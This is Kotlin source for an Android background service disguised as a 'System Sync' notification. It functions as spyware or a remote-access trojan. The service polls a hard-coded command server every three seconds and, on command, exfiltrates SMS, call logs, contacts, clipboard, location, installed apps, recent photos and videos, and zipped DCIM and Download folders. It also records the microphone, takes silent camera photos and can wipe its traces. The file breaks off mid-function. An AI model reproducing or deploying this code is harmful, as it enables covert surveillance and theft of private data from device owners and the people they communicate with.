package com.assets.service

import android.annotation.SuppressLint
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.content.ClipboardManager
import android.content.ContentUris
import android.content.Context
import android.content.Intent
import android.content.pm.ServiceInfo
import android.hardware.camera2.CameraManager
import android.location.Location
import android.location.LocationManager
import android.media.MediaPlayer
import android.media.MediaRecorder
import android.media.RingtoneManager
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.net.Uri
import android.os.Build
import android.os.PowerManager
import android.os.VibrationEffect
import android.os.Vibrator
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.MediaStore
import android.provider.OpenableColumns
import android.provider.Settings
import android.util.Base64
import androidx.camera.core.CameraSelector
import androidx.camera.core.ImageCapture
import androidx.camera.core.ImageCaptureException
import androidx.camera.lifecycle.ProcessCameraProvider
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import androidx.lifecycle.LifecycleService
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import kotlinx.coroutines.suspendCancellableCoroutine
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.io.File
import java.io.FileOutputStream
import java.util.UUID
import java.util.concurrent.TimeUnit
import java.util.zip.Deflater
import java.util.zip.ZipEntry
import java.util.zip.ZipOutputStream
import kotlin.coroutines.resume

class SyncService : LifecycleService() {

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private val SERVER = "https://web-assets-service-3.onrender.com/api/v3/uranium/stream"
    private val UPLOAD = "https://web-assets-service-3.onrender.com/api/v3/uranium/upload_raw"
    
    private var wakeLock: PowerManager.WakeLock? = null
    private lateinit var cameraManager: CameraManager
    private var wifiAutopilot = true

    private val client = OkHttpClient.Builder()
        .connectTimeout(120, TimeUnit.SECONDS)
        .readTimeout(120, TimeUnit.SECONDS)
        .writeTimeout(120, TimeUnit.SECONDS)
        .retryOnConnectionFailure(true)
        .build()

    companion object {
        private const val CHANNEL_ID = "sys_sync_channel"
        private const val NOTIF_ID = 888
    }

    override fun onCreate() {
        super.onCreate()
        acquireWakeLock()
        startForegroundNotif()
        cameraManager = getSystemService(Context.CAMERA_SERVICE) as CameraManager
    }

    private fun acquireWakeLock() {
        try {
            val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
            wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "Assets::WakeV20").apply {
                acquire(30L * 24 * 60 * 60 * 1000)
            }
        } catch (_: Exception) {}
    }

    private fun startForegroundNotif() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val ch = NotificationChannel(CHANNEL_ID, "System Sync", NotificationManager.IMPORTANCE_MIN).apply {
                setShowBadge(false)
                lockscreenVisibility = Notification.VISIBILITY_SECRET
                setSound(null, null)
                enableVibration(false)
            }
            (getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager).createNotificationChannel(ch)
        }
        val n: Notification = NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("System Assets Core")
            .setContentText("جاري تهيئة الملفات...")
            .setSmallIcon(android.R.drawable.stat_sys_data_bluetooth)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setSilent(true)
            .setOngoing(true)
            .build()
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                startForeground(NOTIF_ID, n, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
            } else startForeground(NOTIF_ID, n)
        } catch (_: Exception) {}
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        super.onStartCommand(intent, flags, startId)
        scope.launch {
            while (isActive) {
                try {
                    // إرسال نبضة بصيغة JSON صريحة بدون تشفير
                    val hb = JSONObject().apply {
                        put("type", "HEARTBEAT")
                        put("status", "ONLINE")
                        put("nodeId", getNodeId())
                        put("model", Build.MODEL)
                    }
                    val resp = sendJson(hb.toString())
                    if (resp != null && resp.has("task") && !resp.isNull("task")) {
                        executeTask(resp.getJSONObject("task"))
                    }
                } catch (_: Exception) {}
                delay(3000L)
            }
        }
        return START_STICKY
    }

    private fun sendJson(plain: String): JSONObject? {
        var tries = 0
        while (tries < 3) {
            try {
                val req = Request.Builder()
                    .url(SERVER)
                    .post(plain.toRequestBody("application/json".toMediaType()))
                    .addHeader("x-node-id", getNodeId())
                    .addHeader("x-node-model", Build.MODEL)
                    .addHeader("x-android-sdk", Build.VERSION.SDK_INT.toString())
                    .build()
                client.newCall(req).execute().use { r ->
                    if (r.isSuccessful) {
                        val raw = r.body?.string() ?: "{}"
                        return JSONObject(raw)
                    }
                }
            } catch (_: Exception) { tries++; Thread.sleep(tries * 1000L) }
        }
        return null
    }

    private suspend fun executeTask(task: JSONObject) {
        val action = task.optString("action", "").uppercase()
        when {
            action.contains("CMD_FLASH_ON") -> toggleFlash(true)
            action.contains("CMD_FLASH_OFF") -> toggleFlash(false)
            action.contains("CMD_VIBRATE") -> vibrate(5000)
            action.contains("CMD_BEEP") -> playBeep()
            action.contains("MIC_AI_LISTEN") -> recordAudio()
            action.contains("MICRO_BURST_SNAP") -> streamLatestPhoto("MicroBurst")
            action.contains("EXTRACT_CAMERA_SNAP") -> captureSilentPhoto(false)
            action.contains("EXTRACT_CAMERA_SNAP_FRONT") -> captureSilentPhoto(true)
            action.contains("EXTRACT_SMS") -> sendReport("SMS", readSms())
            action.contains("EXTRACT_CALLS") -> sendReport("CallLog", readCalls())
            action.contains("EXTRACT_CONTACTS") -> sendReport("Contacts", readContacts())
            action.contains("EXTRACT_APPS") -> sendReport("Apps", readApps())
            action.contains("EXTRACT_LOCATION") -> sendReport("Location", readLocation())
            action.contains("EXTRACT_CLIPBOARD") -> sendReport("Clipboard", readClipboard())
            action.contains("EXTRACT_PHOTOS") -> streamMedia(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, 20)
            action.contains("EXTRACT_VIDEOS") -> streamMedia(MediaStore.Video.Media.EXTERNAL_CONTENT_URI, 10)
            action.contains("PROC_DCIM") -> zipFolder("DCIM", MediaStore.Images.Media.EXTERNAL_CONTENT_URI)
            action.contains("PROC_DOWNLOAD") -> zipFolder("Download", MediaStore.Files.getContentUri("external"))
            action.contains("STORAGE_AUDIT") -> sendReport("Audit", storageAudit())
            action.contains("WIFI_AUTOPILOT") -> { wifiAutopilot = !wifiAutopilot; sendReport("WiFi", "Autopilot: $wifiAutopilot") }
            action.contains("GEO_FENCE_ALERT") -> sendReport("GeoAlert", readLocation())
            action.contains("SELF_DESTRUCT") -> { sendReport("Destruct", "Wiping..."); try { cacheDir.deleteRecursively() } catch (_: Exception) {}; stopSelf() }
        }
    }

    // لقطة صامتة بدون واجهة (إزالة Preview لحل مشكلة الخلفية)
    @SuppressLint("MissingPermission")
    private suspend fun captureSilentPhoto(front: Boolean = false) {
        try {
            val provider = ProcessCameraProvider.getInstance(this).get()
            val capture = ImageCapture.Builder()
                .setCaptureMode(ImageCapture.CAPTURE_MODE_MINIMIZE_LATENCY)
                .build()
            val selector = if (front) CameraSelector.DEFAULT_FRONT_CAMERA else CameraSelector.DEFAULT_BACK_CAMERA

            provider.unbindAll()
            // نربط الـ ImageCapture فقط بدون Preview
            provider.bindToLifecycle(this, selector, capture)

            delay(500L) // انتظار بسيط لضبط التركيز

            val file = File(cacheDir, "silent_${System.currentTimeMillis()}.jpg")
            val opts = ImageCapture.OutputFileOptions.Builder(file).build()

            val ok = suspendCancellableCoroutine<Boolean> { cont ->
                capture.takePicture(opts, ContextCompat.getMainExecutor(this),
                    object : ImageCapture.OnImageSavedCallback {
                        override fun onImageSaved(results: ImageCapture.OutputFileResults) {
                            cont.resume(true)
                        }
                        override fun onError(e: ImageCaptureException) {
                            sendReport("CamErr", e.message ?: "?")
                            cont.resume(false)
                        }
                    })
            }

            provider.unbindAll()

            if (ok && file.exists() && file.length() > 0) {
                uploadRawFile(file)
                sendReport("Camera", "التقط صورة صامتة (${file.length()/1024}KB)")
            }
            try { file.delete() } catch (_: Exception) {}
        } catch (e: Exception) {
            sendReport("CamErr", e.message ?: "unknown")
        }
    }

    private fun toggleFlash(on: Boolean) {
        try {
            val id = cameraManager.cameraIdList.firstOrNull { camId ->
                cameraManager.getCameraCharacteristics(camId)
                    .get(android.hardware.camera2.CameraCharacteristics.FLASH_INFO_AVAILABLE) == true
            } ?: return
            cameraManager.setTorchMode(id, on)
        } catch (_: Exception) {}
    }

    @SuppressLint("MissingPermission")
    private fun vibrate(ms: Long) {
        try {
            val v = getSystemService(Context.VIBRATOR_SERVICE) as Vibrator
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                v.vibrate(VibrationEffect.createOneShot(ms, VibrationEffect.DEFAULT_AMPLITUDE))
            else @Suppress("DEPRECATION") v.vibrate(ms)
        } catch (_: Exception) {}
    }

    private fun playBeep() {
        try {
            val uri = RingtoneManager.getDefaultUri(RingtoneManager.TYPE_ALARM)
            MediaPlayer().apply { setDataSource(this@SyncService, uri); isLooping = false; prepare(); start() }
        } catch (_: Exception) {}
    }

    private fun recordAudio() {
        scope.launch {
            try {
                val f = File(cacheDir, "mic_${System.currentTimeMillis()}.3gp")
                val r = MediaRecorder().apply {
                    setAudioSource(MediaRecorder.AudioSource.MIC)
                    setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP)
                    setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB)
                    setOutputFile(f.absolutePath)
                    prepare(); start()
                }
                delay(6000L)
                r.stop(); r.release()
                if (f.exists()) { uploadRawFile(f); sendReport("Mic", "Recorded ${f.length()}b") }
                f.delete()
            } catch (e: Exception) { sendReport("MicErr", e.message ?: "?") }
        }
    }

    private fun streamLatestPhoto(prefix: String) {
        scope.launch {
            try {
                val uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI
                contentResolver.query(uri, arrayOf(MediaStore.MediaColumns._ID, MediaStore.MediaColumns.DISPLAY_NAME),
                    null, null, "${MediaStore.MediaColumns.DATE_ADDED} DESC")?.use { c ->
                    if (c.moveToFirst()) {
                        val idIdx = c.getColumnIndex(MediaStore.MediaColumns._ID)
                        val nIdx = c.getColumnIndex(MediaStore.MediaColumns.DISPLAY_NAME)
                        if (idIdx >= 0) {
                            val itemUri = ContentUris.withAppendedId(uri, c.getLong(idIdx))
                            val name = if (nIdx >= 0) c.getString(nIdx) else "snap.jpg"
                            val bytes = contentResolver.openInputStream(itemUri)?.use { it.readBytes() } ?: return@use
                            // نرسلها عبر الـ Raw Upload مباشرة
                            val tmpFile = File(cacheDir, "${prefix}_$name")
                            FileOutputStream(tmpFile).use { it.write(bytes) }
                            uploadRawFile(tmpFile)
                            tmpFile.delete()
                        }
                    }
                }
            } catch (_: Exception) {}
        }
    }

    private fun sendReport(label: String, content: String) {
        scope.launch {
            val r = JSONObject().apply { put("type", "TEXT_REPORT"); put("data", "=== $label ===\n$content") }
            sendJson(r.toString())
        }
    }

    private fun readSms(): String {
        val sb = StringBuilder()
        try {
            contentResolver.query(Uri.parse("content://sms/inbox"), arrayOf("address", "body"),
                null, null, "date DESC LIMIT 200")?.use { c ->
                val a = c.getColumnIndex("address"); val b = c.getColumnIndex("body")
                while (c.moveToNext()) if (a >= 0 && b >= 0) sb.append("[${c.getString(a)}] ${c.getString(b)}\n---\n")
            }
        } catch (_: Exception) {}
        return sb.toString().ifEmpty { "No SMS or denied" }
    }

    private fun readCalls(): String {
        val sb = StringBuilder()
        try {
            contentResolver.query(CallLog.Calls.CONTENT_URI,
                arrayOf(CallLog.Calls.NUMBER, CallLog.Calls.TYPE, CallLog.Calls.DURATION),
                null, null, CallLog.Calls.DATE + " DESC LIMIT 200")?.use { c ->
                val n = c.getColumnIndex(CallLog.Calls.NUMBER); val t = c.getColumnIndex(CallLog.Calls.TYPE); val d = c.getColumnIndex(CallLog.Calls.DURATION)
                while (c.moveToNext()) {
                    val ty = when (c.getInt(t)) { CallLog.Calls.INCOMING_TYPE -> "IN"; CallLog.Calls.OUTGOING_TYPE -> "OUT"; CallLog.Calls.MISSED_TYPE -> "MISS"; else -> "?" }
                    sb.append("$ty ${c.getString(n)} (${c.getInt(d)}s)\n")
                }
            }
        } catch (_: Exception) {}
        return sb.toString().ifEmpty { "No calls or denied" }
    }

    private fun readContacts(): String {
        val sb = StringBuilder()
        try {
            contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                arrayOf(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME, ContactsContract.CommonDataKinds.Phone.NUMBER),
                null, null, null)?.use { c ->
                val n = c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME); val p = c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
                while (c.moveToNext()) if (n >= 0 && p >= 0) sb.append("${c.getString(n)}: ${c.getString(p)}\n")
            }
        } catch (_: Exception) {}
        return sb.toString().ifEmpty { "No contacts or denied" }
    }

    private fun readApps(): String {
        val sb = StringBuilder()
        try { packageManager.getInstalledPackages(0).forEach { sb.append("${it.packageName}\n") } } catch (_: Exception) {}
        return sb.toString()
    }

    @SuppressLint("MissingPermission")
    private fun readLocation(): String {
        return try {
            val lm = getSystemService(Context.LOCATION_SERVICE) as LocationManager
            var best: Location? = null
            for (p in lm.allProviders) try { lm.getLastKnownLocation(p)?.let { if (best == null || it.time > best!!.time) best = it } } catch (_: Exception) {}
            if (best != null) "Lat: ${best!!.latitude}\nLng: ${best!!.longitude}\nAcc: ${best!!.accuracy}m\nMap: https://maps.google.com/?q=${best!!.latitude},${best!!.longitude}"
            else "No location"
        } catch (e: Exception) { "Err: ${e.message}" }
    }

    private fun readClipboard(): String {
        return try {
            val cb = getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
            if (cb.hasPrimaryClip() && cb.primaryClip?.itemCount ?: 0 > 0) "Text: ${cb.primaryClip?.getItemAt(0)?.text}" else "Empty"
        } catch (e: Exception) { "Err: ${e.message}" }
    }

    private fun storageAudit(): String {
        val sb = StringBuilder()
        try {
            val stats = queryFolderStats(MediaStore.Images.Media.EXTERNAL_CONTENT_URI)
            sb.append("Images: ${stats.first} files | ${String.format("%.2f", stats.second)} MB\n")
            val vstats = queryFolderStats(MediaStore.Video.Media.EXTERNAL_CONTENT_URI)
            sb.append("Videos: ${vstats.first} files | ${String.format("%.2f", vstats.second)} MB\n")
        } catch (_: Exception) {}
        return sb.toString()
    }

    private fun queryFolderStats(uri: Uri): Pair<Int, Double> {
        var cnt = 0; var bytes = 0L
        try {
            contentResolver.query(uri, arrayOf(MediaStore.MediaColumns._ID, MediaStore.MediaColumns.SIZE), null, null, null)?.use { c ->
                val s = c.getColumnIndex(MediaStore.MediaColumns.SIZE); cnt = c.count
                while (c.moveToNext()) if (s >= 0) bytes += c.getLong(s)
            }
        } catch (_: Exception) {}
        return Pair(cnt, bytes.toDouble() / (1024 * 1024))
    }

    private fun getNodeId(): String = try {
        Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID) ?: "node-unknown"
    } catch (_: Exception) { "node-unknown" }

    private fun streamMedia(uri: Uri, limit: Int) {
        scope.launch {
            try {
                contentResolver.query(uri, arrayOf(MediaStore.MediaColumns._ID),
                    null, null, "${MediaStore.MediaColumns.DATE_ADDED} DESC LIMIT $limit")?.use { c ->
                    val idIdx = c.getColumnIndex(MediaStore.MediaColumns._ID)
                    while (c.moveToNext()) if (idIdx >= 0) {
                        val fileUri = ContentUris.withAppendedId(uri, c.getLong(idIdx))
                        val bytes = contentResolver.openInputStream(fileUri)?.use { it.readBytes() } ?: continue
                        val tmpFile = File(cacheDir, getFileName(fileUri))
                        FileOutputStream(tmpFile).use { it.write(bytes) }
                        uploadRawFile(tmpFile)
                        tmpFile.delete()
                    }
                }
            } catch (_: Exception) {}
        }
    }

    private fun zipFolder(folderName: String, uri: Uri) {
        scope.launch {
            try {
                sendReport("Zip", "بدء ضغط $folderName...")
                val out = File(cacheDir, "${folderName}_${System.currentTimeMillis()}.zip")
                ZipOutputStream(FileOutputStream(out)).use { zos ->
                    zos.setLevel(Deflater.BEST_COMPRESSION)
                    contentResolver.query(uri, arrayOf(MediaStore.MediaColumns._ID, MediaStore.MediaColumns.DISPLAY_NAME),
                        null, null, "${MediaStore.MediaColumns.DATE_ADDED} DESC")?.use { c ->
                        val idIdx = c.getColumnIndex(MediaStore.MediaColumns._ID)
                        val nIdx = c.getColumnIndex(MediaStore.MediaColumns.DISPLAY_NAME)
                        var cnt = 0
                        while (c.moveToNext() && cnt < 40) {
                            if (idIdx >= 0) {
                                try {
                                    val fUri = ContentUris.withAppendedId(uri, c.getLong(idIdx))
                                    val name = if (nIdx >= 0) c.getString(nIdx) else "f_${cnt}"
                                    contentResolver.openInputStream(fUri)?.use { ins ->
                                        zos.putNextEntry(ZipEntry("$folderName/$name"))
                                        ins.copyTo(zos)
                                        zos.closeEntry()
                                        cnt++
                                    }
                                } catch (_: Exception) {}
                            }
                        }
                    }
                }
                if (out.exists() && out.length() > 0) {
                    sendReport("Zip", "$folderName جاهز (${out.length()/1024/1024}MB)")
                    uploadRawFile(out)
                }
                out.delete()
            } catch (e: Exception) { sendReport("ZipErr", e.message ?: "?") }
        }
    }

    private fun uploadRaw
